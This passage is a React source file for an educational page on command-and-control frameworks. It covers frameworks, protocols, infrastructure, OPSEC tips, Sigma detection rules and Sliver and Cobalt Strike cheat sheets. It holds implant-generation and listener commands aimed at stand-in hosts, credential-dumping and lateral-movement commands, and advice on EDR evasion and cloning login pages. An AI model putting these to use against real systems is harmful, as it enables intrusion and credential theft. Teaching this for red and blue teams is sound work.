import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  Tabs,
  Tab,
  Chip,
  Grid,
  Card,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Divider,
  Alert,
  AlertTitle,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Stepper,
  Step,
  StepLabel,
  StepContent,
} from "@mui/material";
import { useState } from "react";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import { useNavigate } from "react-router-dom";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import SettingsRemoteIcon from "@mui/icons-material/SettingsRemote";
import CloudIcon from "@mui/icons-material/Cloud";
import SecurityIcon from "@mui/icons-material/Security";
import TerminalIcon from "@mui/icons-material/Terminal";
import BuildIcon from "@mui/icons-material/Build";
import VisibilityOffIcon from "@mui/icons-material/VisibilityOff";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import SchoolIcon from "@mui/icons-material/School";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import WarningIcon from "@mui/icons-material/Warning";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import HttpIcon from "@mui/icons-material/Http";
import DnsIcon from "@mui/icons-material/Dns";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import ComputerIcon from "@mui/icons-material/Computer";
import StorageIcon from "@mui/icons-material/Storage";
import CodeIcon from "@mui/icons-material/Code";
import SpeedIcon from "@mui/icons-material/Speed";
import ShieldIcon from "@mui/icons-material/Shield";
import BugReportIcon from "@mui/icons-material/BugReport";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import PublicIcon from "@mui/icons-material/Public";
import LightbulbIcon from "@mui/icons-material/Lightbulb";
import TimelineIcon from "@mui/icons-material/Timeline";
import PsychologyIcon from "@mui/icons-material/Psychology";
import TrendingUpIcon from "@mui/icons-material/TrendingUp";
import LockIcon from "@mui/icons-material/Lock";
import RouterIcon from "@mui/icons-material/Router";
import LanguageIcon from "@mui/icons-material/Language";
import SyncAltIcon from "@mui/icons-material/SyncAlt";
import MemoryIcon from "@mui/icons-material/Memory";
import FingerprintIcon from "@mui/icons-material/Fingerprint";
import GavelIcon from "@mui/icons-material/Gavel";
import LearnPageLayout from "../components/LearnPageLayout";

// C2 Framework data with expanded details
const c2Frameworks = [
  {
    name: "Cobalt Strike",
    type: "Commercial",
    language: "Java",
    description: "Industry-standard adversary simulation platform with Beacon payload",
    longDescription: "Cobalt Strike is the de facto standard for commercial red team operations. Originally created by Raphael Mudge, it provides a mature, battle-tested platform for adversary simulation. The Beacon payload is highly customizable through Malleable C2 profiles, allowing operators to mimic specific threat actors or blend with legitimate traffic. Its team server model enables collaborative operations with multiple operators working simultaneously.",
    features: ["Malleable C2 profiles", "Beacon payload", "Team server", "Aggressor scripting", "OPSEC features", "BOF (Beacon Object Files)", "Process injection", "Kerberos attacks", "Lateral movement"],
    protocols: ["HTTP/HTTPS", "DNS", "SMB", "TCP"],
    difficulty: "Advanced",
    cost: "Commercial ($5,900/user/year)",
    url: "https://www.cobaltstrike.com",
    useCases: ["Enterprise red team engagements", "APT simulation", "Purple team exercises", "Adversary emulation"],
    limitations: ["Expensive licensing", "Heavily signatured by defenders", "Cracked versions used by real attackers"],
  },
  {
    name: "Sliver",
    type: "Open Source",
    language: "Go",
    description: "Modern, cross-platform C2 framework with multiplayer support",
    longDescription: "Developed by BishopFox, Sliver is a modern open-source alternative to commercial C2 frameworks. Written in Go, it produces cross-platform implants for Windows, macOS, and Linux. Sliver's multiplayer mode allows multiple operators to collaborate in real-time, similar to Cobalt Strike's team server. The Armory extension system enables community-contributed tools and capabilities.",
    features: ["Implant generation", "Multiplayer mode", "Armory extensions", "Staging support", "mTLS security", "WireGuard tunnels", "DNS canaries", "Procedural C2", "HTTPS certificate pinning"],
    protocols: ["HTTP/HTTPS", "DNS", "mTLS", "WireGuard"],
    difficulty: "Intermediate",
    cost: "Free (BSD-3)",
    url: "https://github.com/BishopFox/sliver",
    useCases: ["Budget-conscious red teams", "Cross-platform operations", "Learning C2 concepts", "Open-source alternative to CS"],
    limitations: ["Less mature than Cobalt Strike", "Smaller community", "Fewer ready-made integrations"],
  },
  {
    name: "Havoc",
    type: "Open Source",
    language: "C/C++/Go",
    description: "Modern C2 framework with advanced evasion and a clean UI",
    longDescription: "Havoc is a relatively new open-source C2 framework that focuses heavily on EDR evasion. The Demon agent uses advanced techniques like indirect syscalls, sleep obfuscation, and memory encryption to evade modern endpoint detection. Its clean Qt-based GUI provides an intuitive interface for operators, and the modular architecture allows for easy extension.",
    features: ["Demon agent", "Sleep obfuscation", "Indirect syscalls", "BOF support", "Module system", "Custom shellcode", "Return address spoofing", "Stack duplication", "Heap encryption"],
    protocols: ["HTTP/HTTPS", "SMB"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/HavocFramework/Havoc",
    useCases: ["EDR evasion testing", "Modern Windows environments", "Advanced red team operations"],
    limitations: ["Windows-focused", "Less mature", "Smaller community", "Documentation gaps"],
  },
  {
    name: "Mythic",
    type: "Open Source",
    language: "Go/Python",
    description: "Collaborative, multi-platform red team framework with web UI",
    longDescription: "Mythic takes a unique approach by being agent-agnostic - it provides the C2 infrastructure while allowing operators to use different agent implementations (called 'Payload Types'). Built on Docker, it's easy to deploy and manage. The web-based UI provides real-time updates, task tracking, and comprehensive reporting capabilities.",
    features: ["Agent agnostic", "Docker-based", "Real-time updates", "Task tracking", "Reporting", "Multiple payload types", "SOCKS proxying", "File browser", "Process browser", "Credential management"],
    protocols: ["HTTP/HTTPS", "TCP", "SMB", "WebSocket"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/its-a-feature/Mythic",
    useCases: ["Custom agent development", "Multi-platform operations", "Team collaboration", "Educational purposes"],
    limitations: ["Resource intensive", "Learning curve for custom agents", "Docker dependency"],
  },
  {
    name: "Covenant",
    type: "Open Source",
    language: "C#/.NET",
    description: ".NET-based C2 framework with collaborative features",
    longDescription: "Covenant is a .NET-based C2 framework designed for collaborative red team operations. It uses 'Grunt' implants that leverage the .NET runtime for execution, making it particularly effective in Windows enterprise environments. The web interface provides task management, listener configuration, and real-time collaboration features.",
    features: ["Grunt implants", "Web interface", "Task management", ".NET execution", "Listener management", "Graph visualization", "Template customization", "API access", "Multi-user support"],
    protocols: ["HTTP/HTTPS", "SMB"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/cobbr/Covenant",
    useCases: [".NET environments", "Windows-focused operations", "Learning C2 development"],
    limitations: ["Development appears stalled", ".NET dependency on targets", "Windows-centric"],
  },
  {
    name: "Brute Ratel C4",
    type: "Commercial",
    language: "C/C++",
    description: "Red team & adversary simulation framework focused on EDR evasion",
    longDescription: "Brute Ratel C4 (BRc4) was developed by Chetan Nayak (Paranoid Ninja) with a specific focus on evading modern EDR solutions. The 'Badger' agent uses direct syscalls, sleep masking, memory encryption, and other advanced techniques to remain undetected. It's become popular for operations against well-defended enterprise environments.",
    features: ["Badger agent", "EDR evasion", "Direct syscalls", "Sleep masking", "Memory encryption", "Unhooking", "LDAP sentinel", "SMB pivot", "DoH/DoT support", "Custom shellcode loader"],
    protocols: ["HTTP/HTTPS", "DNS", "SMB", "DoH", "DoT"],
    difficulty: "Advanced",
    cost: "Commercial ($2,500/user/year)",
    url: "https://bruteratel.com",
    useCases: ["EDR-heavy environments", "Advanced adversary simulation", "Mature security programs"],
    limitations: ["Expensive", "Licensing controversies", "Leaked versions in the wild"],
  },
  {
    name: "Metasploit Framework",
    type: "Open Source",
    language: "Ruby",
    description: "Classic exploitation framework with Meterpreter payload",
    longDescription: "Metasploit is the granddaddy of exploitation frameworks, originally created by H.D. Moore in 2003. While not purpose-built as a C2 framework, Meterpreter provides robust post-exploitation capabilities. It's widely used for penetration testing, vulnerability research, and learning. The extensive module library covers thousands of exploits and post-exploitation techniques.",
    features: ["Exploit database", "Meterpreter", "Post modules", "Auxiliary modules", "Payload generation", "Pivoting", "Port forwarding", "Credential harvesting", "Extensive documentation"],
    protocols: ["HTTP/HTTPS", "TCP", "Reverse shells", "Bind shells"],
    difficulty: "Beginner",
    cost: "Free (Pro version available)",
    url: "https://www.metasploit.com",
    useCases: ["Learning exploitation", "Penetration testing", "Vulnerability validation", "CTF competitions"],
    limitations: ["Heavily signatured", "Not designed for stealth", "Limited OPSEC features"],
  },
  {
    name: "Empire/Starkiller",
    type: "Open Source",
    language: "Python/PowerShell/C#",
    description: "PowerShell and Python-based post-exploitation framework",
    longDescription: "Empire was originally developed by @harmj0y and @sixdub, and is now maintained by BC-Security. It specializes in PowerShell and Python-based post-exploitation with a focus on Windows Active Directory environments. Starkiller provides a modern GUI frontend, replacing the original command-line interface.",
    features: ["PowerShell agents", "Python agents", "C# agents", "Starkiller GUI", "Module library", "Listener types", "Malleable profiles", "IronPython agent", "Credential database", "Plugin system"],
    protocols: ["HTTP/HTTPS", "Dropbox", "OneDrive", "Malleable"],
    difficulty: "Beginner",
    cost: "Free",
    url: "https://github.com/BC-SECURITY/Empire",
    useCases: ["Active Directory attacks", "PowerShell-based operations", "Learning post-exploitation"],
    limitations: ["PowerShell heavily monitored", "AMSI can block agents", "Needs obfuscation"],
  },
  {
    name: "PoshC2",
    type: "Open Source",
    language: "Python/PowerShell/C#",
    description: "Proxy-aware C2 framework with multiple implant types",
    longDescription: "PoshC2 is a proxy-aware C2 framework written by Nettitude. It supports multiple implant types including PowerShell, C#, and Python, making it versatile for different environments. The framework is designed to be modular and extensible with a focus on operational flexibility.",
    features: ["Multiple implant types", "Proxy aware", "Domain fronting", "SOCKS proxy", "Daisy chaining", "Modular design", "Reporting", "Sharp implants", "Cross-platform"],
    protocols: ["HTTP/HTTPS", "DNS"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/nettitude/PoshC2",
    useCases: ["Proxy-heavy environments", "Multi-platform needs", "Flexible operations"],
    limitations: ["Smaller community", "Less documentation", "Fewer integrations"],
  },
  {
    name: "Nighthawk",
    type: "Commercial",
    language: "C/C++",
    description: "Highly evasive commercial C2 from MDSec",
    longDescription: "Nighthawk is MDSec's commercial C2 framework, designed from the ground up for evasion. It uses advanced techniques to avoid detection by modern security tools and provides operators with granular control over implant behavior. Access is restricted to vetted organizations.",
    features: ["Advanced evasion", "Customizable profiles", "In-memory execution", "Process injection", "Syscall obfuscation", "Sleep obfuscation", "ETW patching", "Callback masking"],
    protocols: ["HTTP/HTTPS", "DNS", "SMB"],
    difficulty: "Advanced",
    cost: "Commercial (pricing not public)",
    url: "https://www.mdsec.co.uk/nighthawk/",
    useCases: ["High-security environments", "Advanced adversary simulation", "Mature red teams"],
    limitations: ["Very expensive", "Restricted access", "Limited public information"],
  },
];

// Communication protocols with expanded details
const c2Protocols = [
  {
    protocol: "HTTP/HTTPS",
    description: "Web traffic blending - most common and flexible",
    longDescription: "HTTP/HTTPS is the most widely used C2 protocol because it blends with legitimate web traffic. Organizations expect to see HTTP traffic leaving their network, making it difficult to block without breaking business operations. HTTPS adds encryption, preventing content inspection without SSL/TLS interception.",
    pros: ["Blends with normal traffic", "Proxy support", "Customizable headers/URIs", "Wide firewall acceptance", "Can mimic legitimate applications"],
    cons: ["SSL inspection can expose traffic", "Detectable beaconing patterns", "Logs often captured by proxies", "JA3 fingerprinting possible"],
    detection: "Beaconing patterns, JA3/JA3S fingerprints, unusual User-Agents, certificate analysis, anomalous request patterns",
    example: `# Malleable C2 profile snippet (Cobalt Strike)
http-get {
    set uri "/api/v1/updates";
    client {
        header "Accept" "application/json";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
}`,
    icon: <HttpIcon />,
  },
  {
    protocol: "DNS",
    description: "DNS queries/responses for covert communication",
    longDescription: "DNS tunneling uses DNS queries to exfiltrate data and receive commands. Data is encoded in subdomain labels (e.g., base64-encoded-data.malicious.com) or DNS record types like TXT, MX, or CNAME. Because DNS is essential for network functionality, it's rarely blocked outbound.",
    pros: ["Almost always allowed outbound", "Bypasses many security controls", "Works even with strict firewalls", "Low profile during idle periods"],
    cons: ["Very slow throughput (limited by DNS packet size)", "Subdomain length limits (~63 chars per label)", "Modern DNS monitoring can detect", "High query volume is suspicious"],
    detection: "High DNS query volume, unusually long subdomains, TXT record abuse, queries to uncategorized domains, entropy analysis",
    example: `# DNS beacon configuration
# Data is encoded in subdomains:
# aGVsbG8gd29ybGQ.c2.attacker.com -> "hello world"

# Sliver DNS listener
dns --domains c2.attacker.com --lport 53`,
    icon: <DnsIcon />,
  },
  {
    protocol: "SMB Named Pipes",
    description: "Named pipes over SMB for internal pivoting",
    longDescription: "SMB named pipes provide peer-to-peer communication between implants without requiring internet egress. An implant on a compromised host listens on a named pipe, and other internal implants connect to it, creating a chain back to the team server. This is essential for pivoting in segmented networks.",
    pros: ["No internet egress required", "Blends with Active Directory traffic", "Excellent for lateral movement", "Chainable through multiple hosts"],
    cons: ["Internal network only", "SMB signing can interfere", "Windows-only", "Unusual named pipes are detectable"],
    detection: "Unusual named pipe names, SMB connections to unexpected hosts, lateral SMB patterns without corresponding authentication",
    example: `# Cobalt Strike SMB beacon
beacon> spawn x64 smb
beacon> link TARGET_HOST pipe_name

# Common pipe name patterns
\\.\pipe\msagent_[random]
\\.\pipe\status_[random]`,
    icon: <StorageIcon />,
  },
  {
    protocol: "DoH/DoT",
    description: "DNS over HTTPS/TLS - encrypted DNS tunneling",
    longDescription: "DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt DNS queries, preventing inspection of DNS tunneling traffic. By using legitimate DoH providers like Cloudflare (1.1.1.1) or Google (8.8.8.8), the traffic appears as normal HTTPS connections to trusted destinations.",
    pros: ["Traffic is encrypted", "Bypasses DNS inspection/filtering", "Uses trusted provider infrastructure", "Appears as legitimate HTTPS traffic"],
    cons: ["Requires DoH/DoT infrastructure", "Organizations can block known providers", "Still subject to beaconing detection", "Setup complexity"],
    detection: "Blocking known DoH provider IPs, monitoring for DoH endpoint connections, analyzing HTTPS traffic to DNS ports",
    example: `# Using Cloudflare DoH
POST https://cloudflare-dns.com/dns-query
Content-Type: application/dns-message

# Brute Ratel DoH configuration
DOH Provider: https://dns.google/dns-query`,
    icon: <VpnKeyIcon />,
  },
  {
    protocol: "Domain Fronting",
    description: "Using CDN edge servers to mask true destination",
    longDescription: "Domain fronting exploits the way CDNs and cloud providers route traffic. The outer SNI (visible during TLS handshake) shows a legitimate domain, while the inner Host header (encrypted) points to the actual C2 server. Traffic appears to go to legitimate sites like azure.com or cloudfront.net.",
    pros: ["Traffic appears to go to legitimate high-reputation domains", "Very difficult to block without breaking business", "Encrypted inner destination"],
    cons: ["Major CDN providers have blocked this technique", "Complex infrastructure setup", "Costly cloud resources", "Increasingly detected"],
    detection: "Host header vs SNI mismatch analysis (requires TLS inspection), unusual traffic patterns to CDN edge servers",
    example: `# Domain fronting concept
# Outer SNI: allowed.azureedge.net (visible)
# Inner Host: c2.attacker.com (encrypted)

# Traffic flow:
Client -> CDN Edge -> Backend Origin (your C2)`,
    icon: <CloudIcon />,
  },
  {
    protocol: "WebSockets",
    description: "Persistent bidirectional communication channel",
    longDescription: "WebSockets provide full-duplex, persistent connections that allow real-time bidirectional communication. Unlike HTTP polling, the connection stays open, reducing beaconing patterns and enabling faster command execution.",
    pros: ["Low latency commands", "True bidirectional communication", "Less beaconing noise", "Modern web application appearance"],
    cons: ["Long-lived connections are visible", "WebSocket inspection possible", "Less common in enterprise environments", "Connection interruption issues"],
    detection: "Long-lived WebSocket connections, unusual WebSocket endpoints, WebSocket to non-standard ports",
    example: `// WebSocket C2 connection
const ws = new WebSocket('wss://cdn.example.com/api/stream');
ws.onmessage = (event) => {
    executeCommand(JSON.parse(event.data));
};`,
    icon: <NetworkCheckIcon />,
  },
  {
    protocol: "ICMP",
    description: "Ping-based covert channel",
    longDescription: "ICMP tunneling hides data within ICMP echo request/reply packets (ping). While rarely used for full C2 due to bandwidth limitations, it can be useful for exfiltration or as a backup channel when other protocols are blocked.",
    pros: ["Often allowed through firewalls", "Very low profile", "Simple implementation", "Backup communication channel"],
    cons: ["Extremely limited bandwidth", "Easy to detect anomalies", "May be blocked in secure environments", "Limited payload size"],
    detection: "ICMP packet size anomalies, high ICMP frequency, data in ICMP payload examination",
    example: `# ICMP tunnel example (ptunnel-ng)
# Server side:
ptunnel-ng -s

# Client side:
ptunnel-ng -p proxy_server -l 8000 -r target -R 22`,
    icon: <RouterIcon />,
  },
  {
    protocol: "External Services (Dead Drop)",
    description: "Using legitimate services as intermediary",
    longDescription: "Dead drop resolvers use legitimate third-party services (Dropbox, OneDrive, Google Docs, Pastebin, Twitter) as intermediaries. Commands are posted to the service, and implants poll the service for updates. This provides excellent cover because traffic goes to legitimate, trusted services.",
    pros: ["Traffic to highly trusted domains", "Difficult to block without business impact", "Can survive infrastructure takedowns", "Plausible deniability"],
    cons: ["Service providers may detect abuse", "Account suspension risk", "Slower than direct C2", "Less control over infrastructure"],
    detection: "Anomalous API usage patterns, unusual document access patterns, correlation of service access with other indicators",
    example: `# Empire Dropbox listener
# Implant polls Dropbox for commands
# Responses uploaded back to Dropbox

# Twitter dead drop (historical)
# Commands encoded in tweets
# Implant follows specific account`,
    icon: <LanguageIcon />,
  },
];

// Infrastructure components with expanded details
const infrastructureComponents = [
  {
    component: "Team Server",
    description: "Central C2 server that manages implants and operators",
    longDescription: "The team server is the brain of your C2 operation. It manages all implant connections, stores collected data, and provides the interface for operators. Never expose your team server directly to the internet - always use redirectors.",
    considerations: ["Should be protected behind redirectors", "Use strong authentication for operators", "Enable comprehensive logging and audit trails", "Regular backups of operation data", "Secure hosting environment"],
    bestPractices: ["VPN or SSH tunnel for operator access", "Separate from redirector infrastructure", "Monitor for unauthorized access attempts", "Use unique passwords per operation"],
    icon: <StorageIcon />,
  },
  {
    component: "Redirectors",
    description: "Proxy servers that forward C2 traffic to hide team server",
    longDescription: "Redirectors (or redirector servers) act as disposable proxies between implants and your team server. If compromised or detected, redirectors can be burned and replaced while the team server remains safe. They also filter out researcher probes and invalid traffic.",
    considerations: ["Should be expendable/replaceable", "Geographic distribution for cover", "Traffic filtering rules", "SSL/TLS termination", "Separate providers from team server"],
    bestPractices: ["Use mod_rewrite or nginx for traffic filtering", "Only forward traffic matching C2 profile", "Redirect invalid traffic to legitimate sites", "Maintain multiple redirectors for redundancy"],
    icon: <AccountTreeIcon />,
  },
  {
    component: "Payload Hosting",
    description: "Servers hosting initial payloads and stagers",
    longDescription: "Payload hosting infrastructure serves the initial malware delivery. This should be completely separate from your C2 infrastructure and should be short-lived - spin up before operation, tear down after delivery.",
    considerations: ["Short-lived infrastructure", "Completely separate from C2", "Use CDN or legitimate cloud hosting", "Stage-based delivery", "File-less options when possible"],
    bestPractices: ["Pre-register and categorize domains", "Use HTTPS with valid certificates", "Remove payloads after initial delivery", "Consider legitimate file sharing services"],
    icon: <CloudIcon />,
  },
  {
    component: "Phishing Infrastructure",
    description: "Email servers, domains, and landing pages for initial access",
    longDescription: "Phishing infrastructure includes email servers, domain names, and landing pages used for initial compromise. Domain reputation and email deliverability are critical - poorly configured infrastructure will land in spam folders.",
    considerations: ["Domain aging (older = better reputation)", "Proper email authentication (SPF/DKIM/DMARC)", "Domain categorization", "SSL certificates", "Realistic landing pages"],
    bestPractices: ["Register domains weeks/months in advance", "Use reputable email service providers", "Test deliverability before operations", "Clone legitimate login pages accurately"],
    icon: <PublicIcon />,
  },
  {
    component: "DNS Infrastructure",
    description: "Authoritative DNS servers for DNS-based C2",
    longDescription: "For DNS-based C2, you need authoritative DNS servers for your C2 domains. These servers handle the DNS queries from implants and translate them into C2 communications.",
    considerations: ["Reliable DNS hosting", "Short TTL for flexibility", "Multiple DNS servers for redundancy", "Fast propagation capabilities"],
    bestPractices: ["Use reputable DNS providers", "Configure appropriate TTLs", "Test DNS resolution before operations", "Have backup DNS servers ready"],
    icon: <DnsIcon />,
  },
  {
    component: "VPN/Jump Hosts",
    description: "Secure access points for operator connections",
    longDescription: "Operators should never connect directly to C2 infrastructure from personal or corporate networks. VPN servers and jump hosts provide anonymity and separation between operator identity and operation infrastructure.",
    considerations: ["Anonymize operator connections", "Separate from C2 infrastructure", "Strong authentication", "Logging for internal audit"],
    bestPractices: ["Use commercial VPN or self-hosted", "Multi-factor authentication", "Separate jump hosts per operation", "Clean browser profiles for ops"],
    icon: <LockIcon />,
  },
];

// OPSEC considerations with expanded details
const opsecConsiderations = [
  {
    category: "Infrastructure OPSEC",
    description: "Protecting your C2 infrastructure from attribution and discovery",
    items: [
      { tip: "Use redirectors to protect team server IP", detail: "Never expose your team server directly - always use intermediate servers that can be burned" },
      { tip: "Separate infrastructure for different operations", detail: "Compromise of one operation shouldn't expose others. Use different providers, IPs, and domains" },
      { tip: "Domain categorization and aging", detail: "Fresh domains are suspicious. Register domains weeks ahead and get them categorized" },
      { tip: "SSL certificates from legitimate CAs", detail: "Self-signed certs are a red flag. Use Let's Encrypt or commercial CAs" },
      { tip: "VPS providers with good reputation", detail: "Avoid bulletproof hosting - choose reputable providers that blend with legitimate traffic" },
      { tip: "Geographic distribution matching targets", detail: "C2 traffic to unusual countries is suspicious. Use infrastructure in expected locations" },
    ],
  },
  {
    category: "Network OPSEC",
    description: "Making your C2 traffic look legitimate and avoiding network detection",
    items: [
      { tip: "Malleable C2 profiles to mimic legitimate traffic", detail: "Configure your C2 to look like CDN traffic, cloud APIs, or legitimate applications" },
      { tip: "Jitter and sleep timing variations", detail: "Predictable beaconing is easily detected. Add randomness to callback intervals (10-50% jitter)" },
      { tip: "Avoid predictable beaconing intervals", detail: "Exact 60-second intervals are suspicious. Use prime numbers and jitter" },
      { tip: "Use legitimate User-Agent strings", detail: "Match User-Agents to software that's actually installed in the target environment" },
      { tip: "Blend with expected protocol behavior", detail: "If mimicking Chrome, include all expected headers in the correct order" },
      { tip: "Appropriate request/response sizes", detail: "Consistent packet sizes are detectable. Vary sizes to match mimicked application" },
    ],
  },
  {
    category: "Host OPSEC",
    description: "Avoiding detection on compromised endpoints",
    items: [
      { tip: "Process injection into legitimate processes", detail: "Running from suspicious processes (powershell.exe spawning from word.exe) triggers alerts" },
      { tip: "Avoid touching disk when possible", detail: "File-based artifacts are easily detected. Stay in memory when possible" },
      { tip: "Clear command history and artifacts", detail: "PowerShell history, prefetch, and other forensic artifacts can reveal your activities" },
      { tip: "Use indirect syscalls to avoid hooks", detail: "EDRs hook ntdll.dll - indirect syscalls bypass these hooks" },
      { tip: "Sleep obfuscation and memory encryption", detail: "EDRs scan process memory. Encrypt or obfuscate implant code while sleeping" },
      { tip: "Parent PID spoofing", detail: "Make your process appear to be spawned by a legitimate parent process" },
    ],
  },
  {
    category: "Operational OPSEC",
    description: "Best practices for conducting operations without detection",
    items: [
      { tip: "Minimal lateral movement noise", detail: "Each hop creates logs. Plan your path and minimize unnecessary movement" },
      { tip: "Time operations with business hours", detail: "Activity at 3 AM local time is suspicious. Match target's working hours" },
      { tip: "Avoid triggering known detection signatures", detail: "Research what the target's security stack detects. Test against similar tools" },
      { tip: "Use trusted binaries (LOLBins) when possible", detail: "Built-in Windows tools are less suspicious than custom executables" },
      { tip: "Document and coordinate team actions", detail: "Multiple operators doing conflicting actions causes noise. Communicate!" },
      { tip: "Have abort criteria defined", detail: "Know when to pull out. Define clear tripwires for operation termination" },
    ],
  },
];

// Detection methods with expanded details
const detectionMethods = [
  {
    method: "Network Traffic Analysis",
    description: "Analyzing network traffic patterns to identify C2 communications",
    techniques: [
      { name: "Beaconing detection", detail: "Identifying regular callback patterns using statistical analysis of connection intervals" },
      { name: "JA3/JA3S fingerprinting", detail: "TLS client and server fingerprints that can identify specific tools regardless of destination" },
      { name: "DNS anomaly detection", detail: "Detecting tunneling through query volume, subdomain length, and entropy analysis" },
      { name: "SSL certificate analysis", detail: "Identifying suspicious certificates (self-signed, recently issued, unusual SANs)" },
      { name: "Unusual destination analysis", detail: "Connections to uncategorized domains, unusual ASNs, or known malicious infrastructure" },
    ],
    tools: ["Zeek/Bro", "RITA", "JA3er", "Suricata", "Security Onion", "Arkime (Moloch)", "NetworkMiner"],
    sigmaExample: `title: Potential DNS Tunneling
logsource:
    category: dns
detection:
    selection:
        query|re: '^[a-zA-Z0-9]{30,}\\.'
    condition: selection
level: medium`,
  },
  {
    method: "Endpoint Detection",
    description: "Detecting C2 implants and their behaviors on compromised hosts",
    techniques: [
      { name: "Process injection detection", detail: "Monitoring for code injection into legitimate processes (CreateRemoteThread, NtMapViewOfSection)" },
      { name: "Memory scanning", detail: "Periodic scanning of process memory for known implant signatures or suspicious patterns" },
      { name: "Behavioral analysis", detail: "Detecting unusual process behaviors, parent-child relationships, or API call sequences" },
      { name: "AMSI integration", detail: "Antimalware Scan Interface captures scripts and payloads for analysis before execution" },
      { name: "ETW tracing", detail: "Event Tracing for Windows captures low-level system events for threat detection" },
    ],
    tools: ["CrowdStrike Falcon", "Microsoft Defender for Endpoint", "SentinelOne", "Carbon Black", "Sysmon", "YARA", "Velociraptor"],
    sigmaExample: `title: Suspicious Process Injection
logsource:
    category: process_access
    product: windows
detection:
    selection:
        GrantedAccess|contains:
            - '0x1F0FFF'  # PROCESS_ALL_ACCESS
            - '0x1F3FFF'
    filter:
        SourceImage|endswith:
            - '\\System32\\csrss.exe'
            - '\\System32\\lsass.exe'
    condition: selection and not filter
level: high`,
  },
  {
    method: "Log Analysis",
    description: "Correlating logs across systems to identify C2 activity",
    techniques: [
      { name: "Authentication anomalies", detail: "Unusual login patterns, times, or locations that indicate compromised credentials" },
      { name: "Process creation chains", detail: "Suspicious parent-child process relationships (e.g., Excel spawning PowerShell)" },
      { name: "Network connection patterns", detail: "Processes making unusual outbound connections or connecting to suspicious destinations" },
      { name: "PowerShell logging", detail: "Script block logging and transcription captures executed commands" },
      { name: "Command line analysis", detail: "Detecting encoded commands, suspicious arguments, or known attack patterns" },
    ],
    tools: ["Splunk", "Elastic SIEM", "Microsoft Sentinel", "Sigma", "Chainsaw", "DeepBlueCLI", "LogonTracer"],
    sigmaExample: `title: Encoded PowerShell Command
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - '-enc '
            - '-EncodedCommand'
            - 'FromBase64String'
    condition: selection
level: high`,
  },
  {
    method: "Threat Intelligence",
    description: "Using known indicators and threat actor behaviors to detect C2",
    techniques: [
      { name: "IOC matching", detail: "Matching network and host indicators against known malicious infrastructure" },
      { name: "YARA rules", detail: "Pattern matching for known implant signatures in files and memory" },
      { name: "Behavioral TTP matching", detail: "Identifying techniques associated with specific threat actors or tool families" },
      { name: "Domain intelligence", detail: "Using threat feeds to identify connections to known malicious domains" },
    ],
    tools: ["MISP", "OpenCTI", "ThreatConnect", "Anomali", "VirusTotal", "AlienVault OTX", "Pulsedive"],
    sigmaExample: `title: Known C2 Domain Connection
logsource:
    category: proxy
detection:
    selection:
        c-uri-host:
            - 'known-bad-domain.com'
            - 'another-c2.net'
    condition: selection
level: critical`,
  },
];

// Quick reference commands with expanded examples
const quickCommands = {
  sliver: `# ===== SLIVER C2 QUICK REFERENCE =====

# Start Sliver server (generates certificates on first run)
./sliver-server

# Generate implants
generate --mtls example.com --os windows --arch amd64 --format exe --save implant.exe
generate --http example.com --os linux --arch amd64 --format elf --save implant
generate --dns example.com --os windows --arch amd64 --format shellcode --save implant.bin

# Start listeners
mtls --lhost 0.0.0.0 --lport 8888
http --lhost 0.0.0.0 --lport 80 --domain cdn.example.com
dns --domains c2.attacker.com --lport 53

# Session management
sessions                    # List all sessions
sessions -i                 # Interactive session list
use [session-id]           # Interact with session
background                  # Background current session

# Common beacon commands
info                       # Get system information
whoami                     # Current user context
ps                         # List processes
netstat                    # Network connections
ifconfig                   # Network interfaces
pwd / cd / ls              # File system navigation
download /path/to/file     # Download file
upload /local/file /remote # Upload file
execute -o -- cmd.exe /c whoami  # Execute command
shell                      # Interactive shell
screenshot                 # Capture screen

# Pivoting
pivots                     # List pivots
socks5 start               # Start SOCKS proxy
portfwd add -l 8080 -r 10.0.0.1:80  # Port forward

# Armory (extensions)
armory                     # List available packages
armory install rubeus      # Install Rubeus
rubeus dump                # Run Rubeus`,

  cobaltStrike: `# ===== COBALT STRIKE QUICK REFERENCE =====

# Start team server (requires malleable profile for OPSEC)
./teamserver <IP> <password> <malleable_profile.profile>
./teamserver 10.0.0.1 MySecretPass ./profiles/amazon.profile

# Connect client
./cobaltstrike
# Enter: IP, Port (50050), User, Password

# Generate payloads (via GUI)
# Attacks > Packages > Windows Executable (S)
# Attacks > Packages > HTML Application
# Attacks > Scripted Web Delivery (HTA)

# Listener management (via GUI)
# Cobalt Strike > Listeners > Add
# Types: HTTP, HTTPS, DNS, SMB, TCP

# Beacon commands
beacon> help               # Show all commands
beacon> sleep 60 20        # Sleep 60s with 20% jitter
beacon> checkin            # Force check-in now
beacon> getuid             # Current user
beacon> shell whoami       # Run command
beacon> run whoami /all    # Run without cmd.exe
beacon> powershell-import script.ps1  # Import PS
beacon> powerpick Get-Process         # Execute PS

# Process manipulation
beacon> ps                 # List processes
beacon> inject <pid> x64   # Inject into process
beacon> spawn x64          # Spawn new beacon
beacon> spawnas DOMAIN\\user pass x64  # Spawn as user

# Lateral movement
beacon> jump psexec TARGET listener    # PSExec
beacon> jump winrm TARGET listener     # WinRM
beacon> jump wmi TARGET listener       # WMI
beacon> remote-exec psexec TARGET cmd  # Remote exec

# Credential harvesting
beacon> logonpasswords     # Mimikatz sekurlsa::logonpasswords
beacon> hashdump           # Dump SAM hashes
beacon> dcsync DOMAIN.COM DOMAIN\\Administrator

# Pivoting
